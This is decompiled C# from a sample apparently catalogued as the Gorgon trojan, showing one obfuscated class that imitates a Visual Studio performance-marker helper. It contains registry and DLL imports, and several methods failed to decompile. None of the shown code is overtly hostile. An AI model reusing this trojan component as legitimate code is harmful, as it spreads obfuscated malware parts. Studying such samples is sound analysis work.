// Decompiled with JetBrains decompiler
// Type: RZ4Qj8v.Ezvwhkz
// Assembly: gO77Fih, Version=16.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a
// MVID: F43F05C3-DF79-4EF2-8C94-619BF1ED6D3E
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Gorgon.gen-83f6c309f411e1aebbdf75c62f67f163231f1b0ee065936230741272cda1cb9a.exe

using gO77Fih.My;
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Diagnostics.CodeAnalysis;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;

namespace RZ4Qj8v
{
  internal sealed class Ezvwhkz
  {
    public static readonly Ezvwhkz ppp3QXv = new Ezvwhkz();
    private const string bZGlp88 = "VSCodeMarkersEnabled";
    private const string dzkg2ex = "Microsoft.Internal.Performance.CodeMarkers.dll";
    private const string crkCVLi = "Microsoft.VisualStudio.CodeMarkers.dll";
    private Ezvwhkz.\u0030h96Shb eaNvQzP;
    private RegistryView PJDd9qG;
    private string KAKvoQD;
    private bool? \u0038np3b6d;
    private static readonly byte[] U7BbiQV = new Guid("AA10EEA0-F6AD-4E21-8865-C427DAE8EDB9").ToByteArray();

    public bool OLBWf2L
    {
      get
      {
        // ISSUE: unable to decompile the method.
      }
    }

    [SuppressMessage("Microsoft.Design", "CA1031:DoNotCatchGeneralExceptionTypes")]
    public bool UlidiL0
    {
      get
      {
        if (!this.\u0038np3b6d.HasValue)
        {
          try
          {
            this.\u0038np3b6d = this.KAKvoQD != null ? new bool?(Ezvwhkz.\u0038CY0Dvn(this.KAKvoQD, this.PJDd9qG)) : new bool?(Ezvwhkz.\u0033ZsO6ND.hJPLHSP("Microsoft.VisualStudio.Ezvwhkz.dll") == IntPtr.Zero);
          }
          catch (Exception ex)
          {
            this.\u0038np3b6d = new bool?(true);
          }
        }
        return this.\u0038np3b6d.Value;
      }
    }

    private Ezvwhkz()
    {
      // ISSUE: unable to decompile the method.
    }

    [SuppressMessage("Microsoft.Performance", "CA1811:AvoidUncalledPrivateCode")]
    public bool BJepd3S(int Gmfv0bt)
    {
      // ISSUE: unable to decompile the method.
    }

    [SuppressMessage("Microsoft.Performance", "CA1811:AvoidUncalledPrivateCode")]
    public bool fSbsZHh(int SVtAlqC, byte[] AEs1lce)
    {
      // ISSUE: unable to decompile the method.
    }

    [SuppressMessage("Microsoft.Performance", "CA1811:AvoidUncalledPrivateCode")]
    public void InxvuOA()
    {
      // ISSUE: unable to decompile the method.
    }

    [SuppressMessage("Microsoft.Performance", "CA1811:AvoidUncalledPrivateCode")]
    public bool \u0039ojmHFa(int _param1, Guid jtbrpSW) => this.fSbsZHh(_param1, jtbrpSW.ToByteArray());

    [SuppressMessage("Microsoft.Performance", "CA1811:AvoidUncalledPrivateCode")]
    public bool CmNdUyM(int fhI7g5N, string _param2)
    {
      // ISSUE: unable to decompile the method.
    }

    [SuppressMessage("Microsoft.Performance", "CA1811:AvoidUncalledPrivateCode")]
    internal static byte[] onlfaGj(string NNc6QkO)
    {
      Encoding unicode = Encoding.Unicode;
      byte[] bytes = new byte[unicode.GetByteCount(NNc6QkO) + 2];
      unicode.GetBytes(NNc6QkO, 0, NNc6QkO.Length, bytes, 0);
      return bytes;
    }

    [SuppressMessage("Microsoft.Performance", "CA1811:AvoidUncalledPrivateCode")]
    public static byte[] H1jliRE(byte[] Oq5FFG6, Guid MPaC0La)
    {
      if (MPaC0La == Guid.Empty)
        return Oq5FFG6;
      byte[] byteArray = MPaC0La.ToByteArray();
      byte[] numArray = new byte[Ezvwhkz.U7BbiQV.Length + byteArray.Length + (Oq5FFG6 != null ? Oq5FFG6.Length : 0)];
      Ezvwhkz.U7BbiQV.CopyTo((Array) numArray, 0);
      byteArray.CopyTo((Array) numArray, Ezvwhkz.U7BbiQV.Length);
      Oq5FFG6?.CopyTo((Array) numArray, Ezvwhkz.U7BbiQV.Length + byteArray.Length);
      return numArray;
    }

    [SuppressMessage("Microsoft.Performance", "CA1811:AvoidUncalledPrivateCode")]
    public bool QhQ02Ak(int c30oP1i, uint FwDIOGI) => this.fSbsZHh(c30oP1i, BitConverter.GetBytes(FwDIOGI));

    [SuppressMessage("Microsoft.Performance", "CA1811:AvoidUncalledPrivateCode")]
    public bool XVuEgxc(int U0AorHE, ulong UMZtEfh) => this.fSbsZHh(U0AorHE, BitConverter.GetBytes(UMZtEfh));

    private static bool \u0038CY0Dvn(string iCboXKj, RegistryView A01nRG8)
    {
      if (iCboXKj == null)
        throw new ArgumentNullException("regRoot");
      using (RegistryKey registryKey1 = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, A01nRG8))
      {
        using (RegistryKey registryKey2 = registryKey1.OpenSubKey(iCboXKj + "\\Performance"))
        {
          if (registryKey2 != null)
            return !string.IsNullOrEmpty(registryKey2.GetValue(string.Empty).ToString());
        }
      }
      return false;
    }

    private static class \u0033ZsO6ND
    {
      [SuppressMessage("Microsoft.Performance", "CA1811:AvoidUncalledPrivateCode")]
      [DllImport("Microsoft.Internal.Performance.CodeMarkers.dll", EntryPoint = "PerfCodeMarker")]
      public static extern void \u00333BJErx(int _param0, [MarshalAs(UnmanagedType.LPWStr)] string UqRNSmj, int nWt1Uum);

      [DllImport("Microsoft.VisualStudio.CodeMarkers.dll", EntryPoint = "PerfCodeMarker")]
      public static extern void fWfhKRy(int QXJImY2, [MarshalAs(UnmanagedType.LPArray, SizeParamIndex = 2)] byte[] cBWdRx2, int MXGRxSu);

      [SuppressMessage("Microsoft.Performance", "CA1811:AvoidUncalledPrivateCode")]
      [DllImport("Microsoft.VisualStudio.CodeMarkers.dll", EntryPoint = "PerfCodeMarker")]
      public static extern void TRzSx9u(int HRHJyyk, [MarshalAs(UnmanagedType.LPWStr)] string b0sCPMr, int xM4wJ8f);

      [DllImport("kernel32.dll", EntryPoint = "FindAtom", CharSet = CharSet.Unicode)]
      public static extern ushort zwSzBX7([MarshalAs(UnmanagedType.LPWStr)] string _param0);

      [DllImport("kernel32.dll", EntryPoint = "GetModuleHandle", CharSet = CharSet.Unicode)]
      public static extern IntPtr hJPLHSP([MarshalAs(UnmanagedType.LPWStr)] string L3Xl9Dx);

      [DebuggerHidden]
      [SpecialName]
      internal T0 get_GetInstance()
      {
        if ((object) MyProject.xgtJxWk<T0>.m_ThreadStaticValue == null)
          MyProject.xgtJxWk<T0>.m_ThreadStaticValue = Activator.CreateInstance<T0>();
        return MyProject.xgtJxWk<T0>.m_ThreadStaticValue;
      }
    }

    private enum \u0030h96Shb
    {
      Enabled,
      Disabled,
      DisabledDueToDllImportException,
    }
  }
}
